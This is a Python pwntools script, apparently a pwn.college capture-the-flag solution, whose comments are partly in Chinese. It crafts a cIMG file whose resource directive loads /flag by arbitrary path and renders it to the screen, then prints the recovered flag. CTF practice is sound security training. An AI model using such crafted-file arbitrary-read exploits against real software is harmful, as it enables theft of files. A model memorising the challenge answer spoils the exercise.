"""cIMG exploit: load /flag via resource directive, render to screen."""
import re
import struct

from pwn import context, log, process

context.log_level = "error"


def exploit():
    binary_path = "/challenge/cimg"

    flag_len = 59
    payload = bytearray()

    # 1. 极简 Header: Version 4, 画布大小 100x1, 2 个指令
    payload += struct.pack("<4sHBBI", b"cIMG", 4, 100, 1, 2)

    # 2. Directive 1 -> handle_5: 任意文件加载
    payload += struct.pack("<H", 5)  # Opcode 5
    payload += struct.pack("<BBB", 1, flag_len, 1)  # ID=1, Width=flag_len, Height=1
    path = b"/flag".ljust(255, b"\x00")  # 恶意路径，Null截断
    payload += path

    # 3. Directive 2 -> handle_4: 渲染到屏幕
    # 参数: Opcode(4), ID(1), R(255), G(255), B(255), X(0), Y(0), RepeatX(1), RepeatY(1), Trans(0)
    payload += struct.pack("<HBBBBBBBBB", 4, 1, 255, 255, 255, 0, 0, 1, 1, 0)

    file_name = "exploit_payload.cimg"
    with open(file_name, "wb") as f:
        f.write(payload)

    try:
        # 执行二进制
        p = process([binary_path, file_name])
        out = p.recvall(timeout=1).decode(errors="ignore")

        # 只要没有触发异常报错，说明长度猜对了，绕过了 \n！
        if "ERROR" not in out:
            # 用正则剥离 ANSI 颜色涂装 (KISS 原则)
            clean_text = re.sub(r"\x1b\[.*?m", "", out)

            # 寻找我们想要的 flag
            if "pwn.college" in clean_text:
                print(f"\n[+] Success Flag length: {flag_len}")
                print(f"[*] Raw Flag: {clean_text.strip()}")
                return
    except Exception:
        pass

    print("[-] Exploit failed.")


if __name__ == "__main__":
    exploit()
